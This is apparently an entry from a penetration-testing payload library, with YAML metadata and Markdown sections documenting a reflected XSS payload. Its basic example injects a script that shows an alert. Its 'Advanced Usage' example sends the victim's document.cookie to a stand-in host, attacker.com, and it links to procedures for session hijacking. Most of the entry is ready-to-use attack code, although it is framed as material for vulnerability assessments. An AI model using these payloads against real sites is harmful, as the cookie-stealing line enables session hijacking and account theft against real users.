---
data: '"><script>alert(''XSS'')</script>'
tags:
  - xss
  - payload
type: command
executor: javascript
platforms:
  - Web
id: bcc73d6d-e6ea-474c-b031-9abfedf0879f
created_at: '2025-12-14T00:11:25.155Z'
updated_at: '2025-12-14T00:11:25.155Z'
verified: false
validated: true
submitted: true
---
# JavaScript XSS Payload

## Command

```javascript
"><script>alert('XSS')</script>
```

## Description

This is a basic JavaScript payload for testing reflected XSS by breaking out of HTML context and executing an alert, commonly used in web vulnerability assessments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `script` | The JavaScript code to execute | Yes |

## Examples

### Basic Usage

```javascript
"><script>alert('XSS')</script>
```

### Advanced Usage

```javascript
"><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

## Expected Output

Execution of the script in the browser, such as an alert box or data exfiltration.

## Related

- [[procedures/Craft-and-Inject-XSS-Payload]]
- [[procedures/Exploit-XSS-for-Session-Hijacking]]
